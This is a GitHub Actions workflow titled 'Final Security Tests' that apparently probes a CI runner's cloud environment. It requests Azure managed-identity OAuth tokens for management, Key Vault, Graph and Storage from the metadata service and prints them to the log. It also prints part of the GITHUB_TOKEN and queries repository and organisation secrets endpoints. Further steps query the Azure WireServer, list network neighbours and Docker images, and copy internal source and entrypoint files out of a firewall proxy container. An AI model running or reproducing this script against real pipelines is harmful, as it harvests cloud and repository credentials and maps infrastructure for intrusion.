name: Final Security Tests

on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read
  actions: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Azure IMDS Full Dump
        continue-on-error: true
        run: |
          set +e
          echo "=== IMDS Instance ==="
          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | python3 -m json.tool 2>&1 | head -100
          echo ""
          echo "=== IMDS Management Token ==="
          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1
          echo ""
          echo "=== IMDS Vault Token ==="
          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" 2>&1
          echo ""
          echo "=== IMDS Graph Token ==="
          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com" 2>&1
          echo ""
          echo "=== IMDS Storage Token ==="
          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" 2>&1
          echo ""

      - name: GITHUB_TOKEN Analysis
        continue-on-error: true
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set +e
          echo "=== Token First 20 Chars ==="
          echo "${GH_TOKEN:0:20}..."
          echo ""
          echo "=== Token Scopes ==="
          curl -sI -H "Authorization: token $GH_TOKEN" "https://api.github.com/" 2>&1 | grep -iE "scope|rate|x-oauth" | head -10
          echo ""
          echo "=== Private Repo Access ==="
          curl -sS -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/test4100test-cloud/private-secret-test" 2>&1 | head -10
          echo ""
          echo "=== Repo Secrets List ==="
          curl -sS -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/test4100test-cloud/sec-test/actions/secrets" 2>&1
          echo ""
          echo "=== Org Secrets ==="
          curl -sS -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/test4100test-cloud/sec-test/actions/organization-secrets" 2>&1
          echo ""
          echo "=== Environment Secrets ==="
          curl -sS -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/test4100test-cloud/sec-test/environments" 2>&1
          echo ""

      - name: Infrastructure Recon
        continue-on-error: true
        run: |
          set +e
          echo "=== Wireserver Goalstate ==="
          curl -sS --connect-timeout 3 "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>&1 | head -40
          echo ""
          echo "=== Wireserver Extensions ==="
          curl -sS --connect-timeout 3 "http://168.63.129.16/machine/?comp=config&type=exthandlers" -H "x-ms-version: 2012-11-30" 2>&1 | head -30
          echo ""
          echo "=== Network Neighbors ==="
          ip neigh show 2>&1 | head -20
          echo ""
          echo "=== Routes ==="
          ip route show 2>&1 | head -20
          echo ""
          echo "=== Docker Images ==="
          docker images 2>&1
          echo ""

      - name: AWF Internal Data
        continue-on-error: true
        run: |
          set +e
          docker create --name ap ghcr.io/github/gh-aw-firewall/api-proxy:latest 2>/dev/null
          echo "=== COPILOT_PLACEHOLDER_TOKEN ==="
          docker cp ap:/app/providers/copilot-byok.js /tmp/byok.js 2>&1
          grep -n "PLACEHOLDER|placeholder|sentinel|SENTINEL" /tmp/byok.js 2>&1
          echo ""
          echo "=== Entrypoint.sh ==="
          docker cp ap:/usr/local/bin/entrypoint.sh /tmp/entry.sh 2>&1
          cat /tmp/entry.sh 2>&1
          echo ""
          echo "=== Proxy-request.js (rate limiting) ==="
          docker cp ap:/app/proxy-request.js /tmp/proxy-req.js 2>&1
          head -80 /tmp/proxy-req.js 2>&1
          echo ""
          echo "=== Server-factory.js (HTTP handlers) ==="
          docker cp ap:/app/server-factory.js /tmp/server-factory.js 2>&1
          head -80 /tmp/server-factory.js 2>&1
          echo ""
          echo "=== Complete ==="
